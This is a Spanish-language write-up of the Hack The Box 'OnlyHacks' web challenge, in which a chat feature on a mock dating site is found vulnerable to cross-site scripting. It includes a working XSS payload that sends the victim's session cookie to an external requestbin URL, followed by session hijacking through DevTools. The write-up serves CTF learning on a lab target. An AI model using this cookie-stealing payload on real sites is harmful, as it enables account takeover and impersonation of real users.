---
title: OnlyHacks
description: Dating and matching can be exciting especially during Valentine's, but it’s important to stay vigilant for impostors. Can you help identify possible frauds?
date: 2025-05-14
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-challenges/web_logo.png
categories:
  - Hack The Box
  - Challenges
tags:
  - hack the box
  - xss
  - devtools
  - cookie hijacking
  - web analysis
  - vulnerability exploitation

---
## Web Analysis

El sitio web simula una plataforma de citas donde es necesario registrarse y autenticarse para acceder a funcionalidades internas.

![](assets/img/htb-writeup-onlyhacks/onlyhacks1.png)
![](assets/img/htb-writeup-onlyhacks/onlyhacks2.png)

Una vez dentro, en la sección `Dashboard` se pueden aceptar matches y en la sección `Matches` se accede a un sistema de mensajería con distintos usuarios. En particular, se encuentra un chat activo con el usuario `Renata`.

![](assets/img/htb-writeup-onlyhacks/onlyhacks3.png)

Probando la funcionalidad del chat, envío el payload `<script>alert(1)</script>`. Al ser procesado y renderizado, el navegador ejecuta el alert, confirmando la presencia de una vulnerabilidad de Cross-Site Scripting.

![](assets/img/htb-writeup-onlyhacks/onlyhacks4.png)

---
## Vulnerability Exploitation

El sitio [requestbin](https://requestbin.whapi.cloud/) permite generar una URL que registra y muestra las solicitudes HTTP recibidas, útil para capturar información del cliente que interactúa con ella.

Para activar el endpoint generado, realizo una solicitud con curl.

```terminal
/home/kali/Documents/htb/challenges/onlyhacks:-$ curl -X POST -d "fizz=buzz" http://requestbin.whapi.cloud/1lxcu131
ok
```
Con esto verificado, construyo un payload XSS que envía las cookies de la víctima al endpoint generado.

```js
<script>document.location='http://requestbin.whapi.cloud/1lxcu131?c='+document.cookie</script>
```

![](assets/img/htb-writeup-onlyhacks/onlyhacks5.png)

Envío este payload por el chat con Renata y espero la solicitud desde el panel de requestbin.

![](assets/img/htb-writeup-onlyhacks/onlyhacks6.png)

Una vez capturada la sesión, tomo el valor de la cookie session y la sustituyo desde DevTools para suplantar la identidad de Renata.

![](assets/img/htb-writeup-onlyhacks/onlyhacks7.png)

Al recargar la página, accedo al panel como el usuario Renata. Desde allí, puedo ver tanto el chat conmigo como una conversación con otro usuario que contiene la flag.

![](assets/img/htb-writeup-onlyhacks/onlyhacks8.png)

> <a href="https://www.hackthebox.com/achievement/challenge/1521382/860" target="_blank">OnlyHacks Challenge from Hack The Box has been Pwned</a>
{: .prompt-tip }